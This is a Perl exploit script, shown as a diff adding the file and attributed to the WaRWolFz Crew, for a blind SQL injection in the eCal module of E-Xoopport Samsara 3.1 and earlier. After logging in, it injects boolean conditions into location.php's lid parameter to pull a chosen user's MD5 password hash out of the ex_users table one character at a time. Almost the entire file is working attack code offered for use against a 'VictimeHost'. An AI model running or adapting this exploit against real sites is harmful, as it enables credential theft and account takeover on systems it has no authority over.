@@ -1,0 +1,147 @@
+#!/usr/bin/perl
+# [0-Day] E-Xoopport - Samsara <= v3.1 (eCal module) Remote Blind SQL Injection Exploit
+# Author/s: _mRkZ_, WaRWolFz Crew
+# Created: 2010.09.12 after 0 days the bug was discovered.
+# Greetings To: Dante90, Shaddy, StutM, WaRWolFz Crew
+# Web Site: www.warwolfz.org
+
+use strict;
+use warnings;
+use LWP::UserAgent;
+use HTTP::Cookies;
+use HTTP::Request::Common;
+
+$^O eq 'MSWin32' ? system('cls') : system('clear');
+
+print "
+
+E-Xoopport - Samsara <= v3.1 (eCal Module) Remote Blind SQL Injection Exploit
+
++---------------------------------------------------+
+| Script: E-Xoopport                                |
+| Affected versions: 3.1                            |
+| Bug: Remote Blind SQL Injection (eCal module)     |
+| Author/s: _mRkZ_, WaRWolFz Crew                   |
+| Greetz: Dante90, Shaddy, StutM, WarWolFz Crew     |
+| Web Site: www.warwolfz.org                        |
++---------------------------------------------------+
+| Warn: You must be able to access to 'eCal' Module |
++---------------------------------------------------+
+\r\n";
+
+if (@ARGV != 4) {
+	print "\r\nUsage: perl expolit_name.pl <VictimeHost> <YourNick> <YourPass> <NickToHack>\r\n";
+	exit;
+}
+
+my $host    = $ARGV[0];
+my $usr     = $ARGV[1];
+my $pwd     = $ARGV[2];
+my $anickde = $ARGV[3];
+my $anick   = '0x'.EncHex($anickde);
+
+print "[!] Logging In...\r\n";
+
+my %postdata = (
+	uname => "$usr",
+	pass => "$pwd",
+	op => "login"
+);
+my $cookies = HTTP::Cookies->new(
+	autosave => 1,
+);
+
+my $ua = LWP::UserAgent->new;
+$ua->agent("Mozilla 5.0");
+$ua->cookie_jar($cookies);
+
+my $req		= (POST $host."/user.php", \%postdata);
+my $request	= $ua->request($req);
+my $content	= $request->content;
+if ($content =~ /<h4>Benvenuto su/i) {
+	print "[+] Logged in!\r\n";
+} else {
+	print "[-] Fatal Error: username/password incorrect?\r\n";
+	exit;
+}
+
+print "[!] Checking permissions...\r\n";
+$ua = LWP::UserAgent->new;
+$ua->agent("Mozilla 5.0");
+$req = $host."/modules/eCal/location.php?lid=1+AND+1=1";
+$ua->cookie_jar($cookies);
+$request	= $ua->get($req);
+$content	= $request->content;
+if ($content !~ /<b>Eventi nella località: <\/b>/ig) {
+	print "[+] Fatal Error: Access denied\r\n";
+	exit;
+} else {
+	print "[+] You have permissions\r\n";
+}
+
+print "[!] Exploiting...\r\n";
+my $i = 1;
+my $pwdchr;
+while ($i != 33) {
+	my $wn	= 47;
+	while (1) {
+		$wn++;
+		my $ua = LWP::UserAgent->new;
+		$ua->agent("Mozilla 5.0");
+		my $req		= $host."/modules/eCal/location.php?lid=1+AND+ascii(substring((SELECT+pass+FROM+ex_users+WHERE+uname=$anick+LIMIT+0,1),$i,1))=$wn";
+		$ua->cookie_jar($cookies);
+		my $request	= $ua->get($req);
+		my $content	= $request->content;
+		open LOGZZ, '>lol.html';
+		print LOGZZ $content;
+		close LOGZZ;
+		if ($content !~ /<b>Eventi nella località: <\/b><a href='localleve\.php\?lid='>/ig) {
+			my $cnt = $1;
+			$pwdchr .= chr($wn);
+			$^O eq 'MSWin32' ? system('cls') : system('clear');
+			PrintChars($anickde, $pwdchr);
+			last;
+		}
+	}
+	$i++;
+}
+
+print "\r\n[!] Exploiting completed!\r\n\r\n";
+print "Visit: www.warwolfz.org\r\n\r\n";
+
+sub PrintChars {
+	my $anick1 = $_[0];
+	my $chars = $_[1];
+print "
+
+E-Xoopport - Samsara <= v3.1 (eCal module) Remote Blind SQL Injection Exploit
+
++---------------------------------------------------+
+| Script: E-Xoopport                                |
+| Affected versions: 3.1                            |
+| Bug: Remote Blind SQL Injection (eCal module)     |
+| Author/s: _mRkZ_, WaRWolFz Crew                   |
+| Greetz: Dante90, Shaddy, StutM, WarWolFz Crew     |
+| Web Site: www.warwolfz.org                        |
++---------------------------------------------------+
+| Warn: You must be able to access to 'eCal' Module |
++---------------------------------------------------+
+
+[!] Logging In...
+[+] Logged in!
+[!] Checking permissions...
+[+] You have permissions
+[!] Exploiting...
+[+] ".$anick1."'s md5 Password: ".$chars."
+";
+}
+
+sub EncHex {
+	my $char = $_[0];
+	chomp $char;
+	my @trans = unpack("H*", "$char");
+	return $trans[0];
+}
+
+
+#[Unit-X] Vuln-X DB 2010.09.21
